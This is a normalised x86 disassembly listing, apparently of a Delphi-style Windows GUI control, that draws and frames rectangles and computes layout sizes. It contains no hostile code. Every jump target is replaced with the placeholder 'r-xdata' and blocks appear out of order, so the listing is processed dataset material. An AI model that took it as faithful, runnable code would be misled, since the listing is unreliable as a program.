mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41ce60
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x10 ]
mov eax [ ebx + 0x160 ]
call sub_41d204
cmp [ ebx + 0x16d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
cmp [ ebx + 0x1c2 ] 0x0
je r-xdata
mov esi [ ebx + 0x160 ]
mov eax [ esi + 0x10 ]
mov dl 0x2
call sub_41cc5c
mov eax [ esi + 0x10 ]
mov dl 0xe
call sub_41cc40
mov eax [ esi + 0x10 ]
mov edx 0xffd8ce
call sub_41cb80
mov eax [ esi + 0x14 ]
mov dl 0x1
call sub_41cf7c
mov eax ebx
call sub_43d8c8
push eax
mov eax ebx
call sub_43d90c
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_41d308
push 0xffffffff
push 0x2
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0x2
push 0xffffffff
lea eax [ esp + 0x8 ]
push eax
call InflateRect
jmp r-xdata
add esp 0x20
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000014
call sub_41c1d4
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_41d628
push eax
call FrameRect
push esi
call DeleteObject
push 0xfffffffe
push 0xfffffffe
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000010
call sub_41c1d4
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_41d628
push eax
call FrameRect
push esi
call DeleteObject
sub_429474
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi ]
cmp edx [ ebx + 0x188 ]
jg r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
xor edx edx
mov [ esi ] edx
sub_4294a4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x1b2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_4294d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43f4d8
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_4291f0
mov [ ebx + 0x174 ] eax
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_41256c
mov eax [ ebp - 0xc ]
mov [ ebx + 0x178 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x17c ] eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
call sub_43d90c
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_43d8c8
sub eax [ ebx + 0x188 ]
mov [ ebx + 0x18c ] eax
mov eax [ ebx + 0x30 ]
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x4c ]
add [ ebx + 0x18c ] eax
inc esi
xor edi edi
mov eax [ ebx + 0x174 ]
mov eax [ eax + 0x48 ]
add [ ebx + 0x18c ] eax
jmp r-xdata
inc esi
xor edi edi
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ecx
mov [ ebx + 0x168 ] eax
mov edx [ eax + 0x1d8 ]
mov [ ebx + 0x198 ] edx
mov edx [ eax + 0x1dc ]
mov [ ebx + 0x19c ] edx
mov eax [ ebx + 0x168 ]
mov [ eax + 0x1dc ] ebx
mov [ eax + 0x1d8 ] sub_4299e0
inc edi
dec esi
jne r-xdata
mov eax [ eax + 0x4c ]
sub [ ebx + 0x18c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4298cc
mov eax ebx
call sub_4290c0
mov eax ebx
call sub_455b34
mov edx eax
mov ecx [ edx + 0x220 ]
test ecx ecx
je r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ eax + 0x5b ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax ebx
call sub_42913c
sub al 0x2
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4413ec
mov dl [ eax + 0x5b ]
dec edx
sub dl 0x2
jae r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4413ec
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ eax + 0x48 ]
sub [ ebx + 0x18c ] eax
sub_429674
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x1a0 ]
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
dec dl
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_43d6a4
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1ba ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440f90
xor edx edx
push ebp
push sub_4297b0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x4c ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x44 ]
call sub_43d658
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_43d6a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440f98
retn
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x190 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a0 ] eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_43d680
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440f90
xor edx edx
push ebp
push sub_429743
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
mov edx [ eax + 0x48 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x190 ]
add edx [ eax + 0x40 ]
call sub_43d634
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x190 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x174 ]
call sub_43d680
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440f98
retn
jmp r-xdata
sub_4297f8
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ecx edx
mov esi eax
mov edi [ ebp + 0xc ]
mov dl [ esi + 0x5b ]
mov eax edx
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ esi + 0x17c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
sub ecx [ esi + 0x178 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
xor eax eax
mov ecx edx
dec cl
je r-xdata
mov [ edi ] eax
cmp eax [ esi + 0x188 ]
jge r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x4c ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
dec cl
je r-xdata
cmp eax [ esi + 0x18c ]
jle r-xdata
mov ecx [ esi + 0x188 ]
mov [ edi ] ecx
jmp r-xdata
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx ]
jmp r-xdata
dec cl
je r-xdata
cmp eax [ edi ]
je r-xdata
mov ecx [ esi + 0x18c ]
mov [ edi ] ecx
mov eax [ esi + 0x174 ]
mov eax [ eax + 0x48 ]
mov ecx [ ebp + 0x8 ]
sub eax [ ecx ]
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn 0x8
sub dl 0x2
je r-xdata
sub eax [ edi ]
jmp r-xdata
sub dl 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ edi ]
sub edx eax
mov eax edx
sub_4298e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43f790
test [ ebp - 0x1 ] 0x8
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x174 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4297f8
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_42913c
sub al 0x2
jne r-xdata
mov al [ ebx + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_429674
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x190 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0x1ac ] eax
cmp [ ebx + 0x1a8 ] 0x2
jne r-xdata
mov eax ebx
call sub_42913c
sub al 0x2
jne r-xdata
sub_42998c
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_43f838
cmp [ esi + 0x174 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn 0x8
mov al [ esi + 0x1a8 ]
sub al 0x1
je r-xdata
mov eax esi
call sub_42913c
sub al 0x2
jne r-xdata
mov eax esi
call sub_429674
mov eax esi
mov si 0xffc7
call sub_403468
sub_4299e0
push ebp
mov ebp esp
push esi
mov esi eax
cmp [ ecx ] 0x1b
jne r-xdata
cmp [ esi + 0x19a ] 0x0
je r-xdata
mov eax esi
mov si 0xffc7
call sub_403468
jmp r-xdata
pop esi
pop ebp
retn 0x4
mov al [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x19c ]
call [ esi + 0x198 ]
sub_429a28
push ebx
mov ebx eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
cmp [ ebx + 0x1ba ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
xor eax eax
mov [ ebx + 0x174 ] eax
mov eax ebx
call sub_4291a8
mov eax [ ebx + 0x168 ]
test eax eax
je r-xdata
mov eax ebx
call sub_42913c
mov edx [ ebx + 0x198 ]
mov [ eax + 0x1d8 ] edx
mov edx [ ebx + 0x19c ]
mov [ eax + 0x1dc ] edx
xor eax eax
mov [ ebx + 0x168 ] eax
sub_429a98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
mov esi [ ebp + 0x1c ]
mov eax 0x48
call sub_4026bc
mov [ eax ] edi
mov edx [ ebp + 0xc ]
push esi
mov esi edx
lea edi [ eax + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov dl [ ebp - 0x1 ]
mov [ eax + 0x14 ] dl
mov [ eax + 0x15 ] bl
mov edx [ esi ]
mov [ eax + 0x16 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0x1a ] edx
mov edx [ ebp + 0x18 ]
mov [ eax + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ eax + 0x24 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x1
mov [ eax + 0x38 ] bl
mov edx [ esi ]
mov [ eax + 0x39 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0x3d ] edx
mov edx [ ebp + 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp + 0x10 ]
mov [ eax + 0x30 ] edx
xor edx edx
mov [ eax + 0x34 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x18
sub_429b18
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov edx ebx
mov eax edi
call sub_413b0c
mov ebx [ ebx + 0x34 ]
mov eax esi
call sub_4026dc
test ebx ebx
jne r-xdata
sub_429b58
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4463c0
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x64
mov eax ebx
call sub_43d680
mov edx 0x32
mov eax ebx
call sub_43d6a4
mov [ ebx + 0x211 ] 0x1
mov [ ebx + 0x212 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x228 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f414
mov esi eax
mov [ ebx + 0x22c ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42bc74
mov [ ebx + 0x230 ] 0x1a
mov [ ebx + 0x234 ] 0x1
mov dl 0x1
mov eax ebx
call sub_445480
mov [ ebx + 0x1f8 ] 0x1
mov dl 0x1
mov eax ebx
call sub_4432d4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_429c24
push ebx
push esi
push edi
push ebp
call sub_4035f8
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x228 ]
call sub_40326c
mov eax [ ebp + 0x22c ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_44641c
test bl bl
jle r-xdata
inc edi
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035e0
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_4139c8
call sub_4026dc
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_4139c8
test eax eax
je r-xdata
sub_429cac
push ebp
mov ebp esp
push ebx
push esi
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
mov ebx [ edx ]
mov esi [ eax + 0x30 ]
cmp ebx [ esi + 0x39 ]
jne r-xdata
mov eax [ eax + 0x30 ]
cmp ecx [ esi + 0x44 ]
je r-xdata
mov ebx [ edx ]
mov [ eax + 0x39 ] ebx
mov [ eax + 0x44 ] ecx
mov ebx [ ebp + 0x8 ]
mov [ ebx - 0x4 ] eax
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov al 0x1
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_429ce8
push ebp
mov ebp esp
add esp 0xffffff50
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x210 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42a819
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42a888
mov [ ebp - 0x55 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x4c ] eax
xor eax eax
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
sub edx eax
jl r-xdata
call sub_403aa4
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6d ] 0x0
mov [ ebp - 0x6c ] 0x2
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x6c ] 0x0
jne r-xdata
mov [ ebp - 0x6d ] 0x1
dec [ ebp - 0x6c ]
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
inc [ ebp - 0x4c ]
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x48 ] 0x1
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x4c ]
jg r-xdata
call sub_403aa4
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_4139c8
mov ebx eax
mov al [ ebx + 0x15 ]
mov [ ebx + 0x38 ] al
cmp [ ebx + 0x15 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0x48 ] 0x1
jne r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x56 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x54 ]
inc eax
mov [ ebp - 0x50 ] eax
xor eax eax
mov [ ebp - 0x50 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
sub edx eax
jl r-xdata
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x50 ]
mov edx [ ebp - 0x54 ]
dec edx
sub edx eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov si 0xffee
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_4139c8
mov ebx eax
mov [ ebp - 0x84 ] ebx
mov eax [ ebp - 0x84 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x84 ]
add eax 0x4
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x84 ]
mov eax [ eax + 0x3d ]
add eax [ ebx + 0x24 ]
mov edx [ ebp - 0x88 ]
sub eax [ edx + 0xc ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x84 ]
mov ecx [ eax + 0x39 ]
mov eax [ ebp - 0x84 ]
add ecx [ eax + 0x44 ]
mov eax [ ebp - 0x88 ]
sub ecx [ eax + 0x8 ]
mov eax [ ebp - 0x88 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x84 ]
add edx [ eax + 0x3d ]
mov eax [ ebp - 0x88 ]
mov eax [ eax ]
mov ebx [ ebp - 0x84 ]
add eax [ ebx + 0x39 ]
call sub_412594
mov eax [ ebp - 0x84 ]
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
inc edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x54 ] eax
jmp r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
cmp eax [ ebp - 0x98 ]
jne r-xdata
mov eax [ esi + 0x24 ]
add [ ebp - 0x8c ] eax
mov esi [ esi + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x41 ] 0x0
cmp [ ebp - 0x41 ] 0x0
je r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
mov [ ebp - 0x56 ] 0x1
lea edx [ ebp - 0x98 ]
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
call sub_43d884
mov eax [ ebp - 0x84 ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
cmp eax [ ebp - 0x94 ]
jne r-xdata
inc [ ebp - 0x48 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
sub edx eax
jg r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebx + 0x1a ] eax
mov eax [ ebp - 0x2c ]
mov [ ebx + 0x3d ] eax
jmp r-xdata
mov [ ebp - 0x41 ] 0x0
mov edx [ ebp - 0x14 ]
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
call sub_4139c8
mov ebx eax
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
mov eax [ ebp - 0x90 ]
sub eax [ ebp - 0x98 ]
mov edx [ ebp - 0x84 ]
mov edx [ edx ]
cmp eax [ edx + 0x48 ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
dec edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x8c ]
sub eax [ ebp - 0x94 ]
mov edx [ ebp - 0x84 ]
mov edx [ edx ]
cmp eax [ edx + 0x4c ]
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
cmp eax [ ebp - 0x1c ]
jle r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x16 ]
mov [ ebx + 0x16 ] edx
mov edx [ eax + 0x1a ]
mov [ ebx + 0x1a ] edx
mov edx [ eax + 0x39 ]
mov [ ebx + 0x39 ] edx
mov edx [ eax + 0x3d ]
mov [ ebx + 0x3d ] edx
mov edx [ eax + 0x24 ]
add [ ebx + 0x1a ] edx
mov edx [ eax + 0x24 ]
add [ ebx + 0x3d ] edx
mov edx [ eax + 0x20 ]
mov [ ebx + 0x20 ] edx
mov eax [ eax + 0x44 ]
mov [ ebx + 0x44 ] eax
mov eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x3d ]
mov eax [ ebx + 0x39 ]
call sub_4125bc
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
sub [ ebp - 0x68 ] eax
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebx + 0x28 ]
push eax
lea ecx [ ebx + 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xd8 ]
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0x68 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x20 ] eax
cmp [ ebp - 0x55 ] 0x0
jne r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x74 ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x10 ]
sub eax [ edx ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
sub edx eax
jg r-xdata
dec [ ebp - 0x14 ]
inc [ ebp - 0x74 ]
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x54 ]
jge r-xdata
mov [ ebp - 0x78 ] ebx
mov eax [ ebp - 0x78 ]
mov edx [ ebp - 0xa8 ]
mov [ eax + 0x16 ] edx
mov eax [ ebp - 0x78 ]
mov edx [ ebp - 0xa4 ]
mov [ eax + 0x1a ] edx
mov eax ebx
mov edx [ ebp - 0xa8 ]
mov [ eax + 0x39 ] edx
mov edx [ ebp - 0xa4 ]
mov [ eax + 0x3d ] edx
mov edx [ ebp - 0xa0 ]
sub edx [ ebp - 0xa8 ]
mov [ eax + 0x44 ] edx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6d ] 0x0
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_4139c8
mov ebx eax
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jge r-xdata
cmp [ ebp - 0x6d ] 0x0
je r-xdata
dec edx
mov [ ebp - 0x74 ] edx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x14 ]
call sub_4139c8
mov ebx eax
mov esi [ ebx ]
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x60 ]
jg r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
mov edx [ ebp - 0x64 ]
sub edx eax
sub [ ebp - 0x60 ] edx
mov eax [ ebp - 0xa8 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0xa4 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0xa0 ]
sub eax [ ebp - 0xa8 ]
mov [ ebp - 0x40 ] eax
